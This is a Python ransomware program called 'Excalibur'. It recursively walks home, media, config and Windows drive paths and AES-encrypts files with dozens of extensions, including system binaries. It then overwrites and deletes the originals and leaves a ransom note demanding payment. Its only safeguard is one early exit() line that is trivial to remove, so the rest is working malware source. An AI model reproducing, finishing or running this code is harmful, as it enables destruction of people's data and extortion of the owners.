import os
import sys

from base64 import encodebytes
from getpass import getpass
from time import time
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor

from Crypto import Random
from Crypto.Hash import SHA256
from Crypto.Cipher import AES

# --------------------------------------------------------------------------

# Variables

# Artwork
ascii_art = """
 ________                                __  __  __                           
|        \                              |  \|  \|  \                          
| $$$$$$$$ __    __   _______   ______  | $$ \$$| $$____   __    __   ______  
| $$__    |  \  /  \ /       \ |      \ | $$|  \| $$    \ |  \  |  \ /      \ 
| $$  \    \$$\/  $$|  $$$$$$$  \$$$$$$\| $$| $$| $$$$$$$\| $$  | $$|  $$$$$$\  
| $$$$$     >$$  $$ | $$       /      $$| $$| $$| $$  | $$| $$  | $$| $$   \$$
| $$_____  /  $$$$\ | $$_____ |  $$$$$$$| $$| $$| $$__/ $$| $$__/ $$| $$      
| $$     \|  $$ \$$\ \$$     \ \$$    $$| $$| $$| $$    $$ \$$    $$| $$      
 \$$$$$$$$ \$$   \$$  \$$$$$$$  \$$$$$$$ \$$ \$$ \$$$$$$$   \$$$$$$  \$$                                                                   
                           ___
                          ( ((
                           ) ))
  .::.                    / /(
 'A .-;-.-.-.-.-.-.-.-.-/| ((::::::::::::::::::::::::::::::::::::::::::::::.._
(E ( ( ( ( ( ( ( ( ( ( ( |  ))   -====================================-      _.>
 `S `-;-`-`-`-`-`-`-`-`-\| ((::::::::::::::::::::::::::::::::::::::::::::::''
  `::'                    \ \(
                           ) ))
                          (_((                
"""

# Note to leave in each path, edit this to fit your needs
note = "Whoops! We're so sorry! Your files have been encrypted. And the only way to decrypt" \
       " them is with the key. If you want the key, you must send us moneyz"

# Array of target extensions that we want to encrypt. Might want to comment out the first row.
target_extensions = [
    'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # System files. May destroy system
    'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw',  # Images
    'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',  # Music and sound
    'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',  # Video and movies
    'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',  # Microsoft office
    'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md',  # OpenOffice, Adobe, Latex, Markdown, etc
    'yml', 'yaml', 'json', 'xml', 'csv',  # Structured data
    'db', 'sql', 'dbf', 'mdb', 'iso',  # Databases and disc images
    'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',  # Web technologies
    'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',  # C source code
    'java', 'class', 'jar',  # java source code
    'ps', 'bat', 'vb',  # windows based scripts
    'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',  # linux/mac based scripts
    'go', 'py', 'pyc', 'bf', 'coffee',  # other source code files
    'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
]

# Get the system's OS
if sys.platform in ["linux"]:
    paths = "/home", "/media", "/mnt", "/etc", "/run", "/srv", "/opt",# "/usr"m "\var"  #, "/root"

elif sys.platform in ["win32", "win64", "Windows", "windows"]:
    paths = "C:\\ ", "."  # Name of each path to recursively walk

# --------------------------------------------------------------------------

# Classes


class Colors:
    bold = "\033[1m"
    underline = "\033[4m"
    white = "\033[1;97m"
    blue = "\033[94m"
    red = "\033[91m"
    green = "\033[92m"
    purple = "\033[95m"


class AesExcalibur:
    """
#****************************************************************************************************#
#-------------------------------------------AesExcalibur Data----------------------------------------#
#                                                                                                    #
# Class Goal: Create an object with methods to encrypt or decrypt files                              #
#                                                                                                    #
#       Methods:                                                                                     #
#                                                                                                    #
#   pad            - Static method used to pad the supplied key with the AES block size.             #
#                                                                                                    #
#   encrypt        - Encrypt takes stream of plaintext message and returns the encrypted message     #
#                                                                                                    #
#   decrypt        - Decrypt an encrypted stream of ciphertext and returns the plaintext             #
#                                                                                                    #
#   encrypt_file   - This function tries to read a file in binary mode, then calls encrypt() on      #
#                    the binary stream. Next it rewrites the original filename as .aes and removes   #
#                    the original file. If an error occurs, skip to the next file.                   #
#                                                                                                    #
#   decrypt_file   - Reversal of encrypt_file                                                        #
#                                                                                                    #
#****************************************************************************************************#
 """

    def __init__(self, password):
        self.key = SHA256.new(password).digest()

    @staticmethod
    def pad(message):
        return message + b"\0" * (AES.block_size - len(message) % AES.block_size)

    def encrypt(self, plain_text):
        """Encrypt a stream of text"""

        padded_text = self.pad(plain_text)
        IV = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, IV)
        return IV + cipher.encrypt(padded_text)

    def decrypt(self, cipher_text):
        """Decrypt a stream of text"""

        IV = cipher_text[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, IV)
        plaintext = cipher.decrypt(cipher_text[AES.block_size:])
        return plaintext.rstrip(b"\0")

    def encrypt_file(self, file_name):
        """Read file, encrypt the text, write the encrypted text to a new file, remove the original"""

        try:
            with open(file_name, 'rb') as f:
                plain_text = f.read()
            encrypted = self.encrypt(plain_text)
            with open(file_name + ".AeS", 'wb+') as f:
                f.write(encrypted)
            secure_delete(file_name)  # Remove the original in a separate thread pool
        except (IOError, ValueError, FileNotFoundError, Exception):
            pass  # Suppress output for progress bars

    def decrypt_file(self, file_name):
        """Read file in, decrypt the text, write the decrypted text to a new file, remove the original"""

        try:
            with open(file_name, 'rb') as f:
                cipher_text = f.read()
            decrypted = self.decrypt(cipher_text)
            with open(file_name[:-4], 'wb+') as f:
                f.write(decrypted)
            secure_delete(file_name)
        except (IOError, ValueError, FileNotFoundError) as err:
            print(Colors.red + "An error occured: {}".format(err))


# --------------------------------------------------------------------------

# Functions
def recursive_walk(paths, target_extensions, mode):
    """
    Walk through each path in the filesystem, return a list of valid files to infect
    or files to decrypt depending on mode param

    :param paths:             Array of paths to walk recursively
    :param target_extensions: Array of targeted extensions
    :param mode:              Encryption mode (encrypt or decrypt)
    :return file_list:        Generator object of valid files to encrypt or decrypt
    """
    for path in paths:
        for root, _, files in os.walk(path):  # root=path, _=subdirectories, files=files of any type
            for file in files:
                if file not in [__name__, "L0VE_NOTE.txt"]:  # Don't encrypt self or ransom note
                    abs_path = os.path.join(root, file)  # Get the files absolute path
                    ext = abs_path.split(".")[-1]  # Set ext to the file's extension
                    if mode == 1:
                        if ext in target_extensions:
                            yield os.path.join(root, file)
                    elif mode == 2:
                        if "AeS" in ext:
                            yield os.path.join(root, file)


def secure_delete(filename, passes=5):
    """
    Securely delete file. Try running shred in a subprocess, if it doesnt exist
    perform a manual 3 pass overwrite using os

    :param passes:    Amount of times to write garbage to the file
    :param filename:  absolute path of file to delete
    """

    if not os.path.exists(filename):  # Most secure delete ever
        return

    with open(filename, "ab+") as f:
        length = f.tell()      # Read each line of the file until the end
        for _ in range(0, passes):  # _ in python is short for a variable that isn't used
            f.seek(0)          # Move back to the start of the file
            f.write(os.urandom(length))  # Write garbage to file
    os.remove(filename)


# --------------------------------------------------------------------------

# Main


def main():
    """
    Recursively encrypt or decrypt the filesystem
    Print beautiful artwork
    Ward away the skids with exit()
    """
    os.system("clear" if sys.platform == "linux" else "cls")
    exit("THIS WILL HARM YOUR COMPUTER")
    print(Colors.blue + ascii_art)

    # Get and encode encryption password
    password = getpass(Colors.bold + "Enter a password for the encryption key: ")
    encoded_pass = encodebytes(bytes(password, "utf-8"))

    # Initialize encryption object in memory
    sanctuary = AesExcalibur(encoded_pass)

    user_input = input(Colors.green + "Encrypt or Decrypt? [e/d] ")
    if user_input in ["e", "E", "enc", "encrypt", "Encrypt"]:

        start = time()

        # Create a generator object with targeted files as iterables
        files = recursive_walk(paths, target_extensions, 1)

        # Much more effective than the threaded class
        with ThreadPoolExecutor(max_workers=25) as pool:  # Max 10 threads
            pool.map(sanctuary.encrypt_file, files)

        # Leave notes
        for path in paths:
            with open(path + "/L0VE_NOTE.txt", "w+") as f:
                f.write(note)

        # IF importing as a module, don't do this unless CONFIRMED
        # Encrypt the Excalibur files - This may already happen and pose a problem in the future if
        # sanctuary.encrypt_file(os.path.abspath(__file__))  # Encrypt main.py
        # sanctuary.encrypt_file(os.path.abspath(sys.argv[0]))

        with open("excalibur.log", "a+") as f:
            f.write("Total runtime for encryption: {}".format(time() - start))

    # Decryption is not threaded purely for debugging purposes
    elif user_input in ["d", "D", "dec", "decrypt", "Decrypt"]:

        start = time()

        files = recursive_walk(paths, target_extensions, 2)

        # Use THREADING instead of multiprocessing for benchmarking
        with ProcessPoolExecutor(max_workers=25) as pool:
            pool.map(sanctuary.decrypt_file, files)

        with open("excalibur.log", "a+") as f:
            f.write("Total runtime for decryption: {}".format(time() - start))

    else:
        exit("Invalid input")


if __name__ == '__main__':
    main()
